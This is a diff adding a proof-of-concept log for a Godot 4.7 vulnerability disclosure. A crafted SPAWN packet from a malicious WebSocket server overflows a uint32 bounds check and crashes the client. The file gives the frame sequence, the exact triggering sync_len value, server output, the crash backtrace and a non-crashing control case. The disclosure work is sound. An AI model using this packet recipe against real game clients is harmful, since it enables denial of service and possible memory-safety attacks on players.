@@ -1,0 +1,102 @@
+# Stock-binary proof — SceneReplicationInterface::on_spawn_receive
+# integer-overflow / OOB read (disclosure 006)
+
+Engine : Godot v4.7.stable.official.5b4e0cb0f
+Binary : Godot_v4.7-stable_win64.exe (official 4.7-stable build; local path redacted for publication)
+Date  : 2026-10-07
+
+Note: the 'rpc node checksum failed' error below is expected and benign:
+process_simplify_path still caches the node (scene_cache_interface.cpp:126-128);
+it only affects the advisory md5 echo, not the path registration the SPAWN needs.
+
+Demo shape: a malicious WebSocket server (server.py) pops a Godot 4.7
+multiplayer CLIENT that connected to it. No file, no @tool, no autoload
+beyond victim_client.gd. The server sends 3 binary WS frames: a 4-byte
+peer id, a NETWORK_COMMAND_SIMPLIFY_PATH (caches the client's spawner),
+then ONE crafted NETWORK_COMMAND_SPAWN whose sync_len overflows the
+bounds check in on_spawn_receive.
+
+======================================================================
+CASE A — overflow:  sync_len = 0x40000000  (sync_len*4 wraps to 0 in uint32)
+======================================================================
+Client exit code : 3221225477   (139 / 0xC0000005 = SIGSEGV / ACCESS_VIOLATION)
+Elapsed          : 0.87s
+
+--- server.py output ---
+[server] listening on ws://127.0.0.1:49300 (malicious game server)
+[server] waiting for a Godot 4.7 victim client to connect...
+[server] Godot client connected from ('127.0.0.1', 58900)
+[server] sent peer id = 2
+[server] cached spawner path '/root/World/Spawner' as id 1
+[server] sent malicious SPAWN (sync_len=0x40000000)
+[server] if the victim is Godot 4.7, it should now crash in on_spawn_receive.
+
+--- Godot victim client output ---
+Godot Engine v4.7.stable.official.5b4e0cb0f - https://godotengine.org
+
+=== 006 victim client: connecting to ws://127.0.0.1:49300 ===
+spawner path: /root/World/Spawner  authority: 1
+ERROR: The rpc node checksum failed. Make sure to have the same methods on both nodes. Node path: /root/World/Spawner
+   at: process_simplify_path (modules/multiplayer/scene_cache_interface.cpp:121)
+   GDScript backtrace (most recent call first):
+       [0] _process (res://victim_client.gd:69)
+
+================================================================
+CrashHandlerException: Program crashed with signal 11
+Engine version: Godot Engine v4.7.stable.official (5b4e0cb0fd279832bbdd69fed5354d4e5ad26f88)
+Dumping the backtrace. Please include this when reporting the bug on: https://github.com/godotengine/godot/issues
+Load address: 7ff655db0000
+
+[1] 7ff799e760e1 (main+40c60e1) - no debug info in PE/COFF executable
+[2] 7ffaf0624702 (ntdll.dll+124702) - no debug info in PE/COFF executable
+[3] 7ffaf06654fe (ntdll.dll+1654fe) - no debug info in PE/COFF executable
+[4] 7ffaf05cbd24 (ntdll.dll+cbd24) - no debug info in PE/COFF executable
+[5] 7ffaf0664e3d (ntdll.dll+164e3d) - no debug info in PE/COFF executable
+[6] 7ff796b313a3 (main+d813a3) - no debug info in PE/COFF executable
+[7] 7ff796b252bf (main+d752bf) - no debug info in PE/COFF executable
+[8] 7ff79b7fb4aa (main+5a4b4aa) - no debug info in PE/COFF executable
+[9] 7ff79640e7ad (main+65e7ad) - no debug info in PE/COFF executable
+[10] 7ff7962e3bd7 (main+533bd7) - no debug info in PE/COFF executable
+[11] 7ff7996c5faa (main+3915faa) - no debug info in PE/COFF executable
+[12] 7ff79823bab1 (main+248bab1) - no debug info in PE/COFF executable
+[13] 7ff795e0d43c (main+5d43c) - no debug info in PE/COFF executable
+[14] 7ff795db2ef0 (main+2ef0) - no debug info in PE/COFF executable
+[15] 7ff795e02501 (main+52501) - no debug info in PE/COFF executable
+[16] 7ff795e0253d (main+5253d) - no debug info in PE/COFF executable
+[17] 7ff795db10c8 (main+10c8) - no debug info in PE/COFF executable
+[18] 7ff795db13f5 (main+13f5) - no debug info in PE/COFF executable
+[19] 7ffaef9fcd86 (kernel32.dll+2cd86) - no debug info in PE/COFF executable
+[20] 7ffaf05acaeb (ntdll.dll+acaeb) - no debug info in PE/COFF executable
+[21] -1 (main+-7ff795db0001) - no debug info in PE/COFF executable
+-- END OF C++ BACKTRACE --
+================================================================
+GDScript backtrace (most recent call first):
+    [0] _process (res://victim_client.gd:69)
+-- END OF GDSCRIPT BACKTRACE --
+================================================================
+
+======================================================================
+CASE B — control:  sync_len = 0x10000000  (sync_len*4 = 0x40000000, NO overflow)
+======================================================================
+With no overflow, the bounds check in on_spawn_receive correctly rejects
+the packet and the client disconnects cleanly. This proves the crash in
+CASE A is specifically caused by the uint32 overflow defeating the check,
+not by any other aspect of the packet.
+
+Client exit code : 3   (3 = clean disconnect, no crash)
+Elapsed          : 5.96s
+
+--- server.py output ---
+[server] listening on ws://127.0.0.1:49300 (malicious game server)
+[server] waiting for a Godot 4.7 victim client to connect...
+[server] Godot client connected from ('127.0.0.1', 58907)
+[server] sent peer id = 2
+[server] cached spawner path '/root/World/Spawner' as id 1
+[server] sent malicious SPAWN (sync_len=0x10000000)
+[server] if the victim is Godot 4.7, it should now crash in on_spawn_receive.
+
+--- Godot victim client output (key lines) ---
+spawner path: /root/World/Spawner  authority: 1
+ERROR: The rpc node checksum failed. Make sure to have the same methods on both nodes. Node path: /root/World/Spawner
+ERROR: Invalid spawn packet size: 27, wants: 1073741843
+!! disconnected without crashing (bug did not fire)
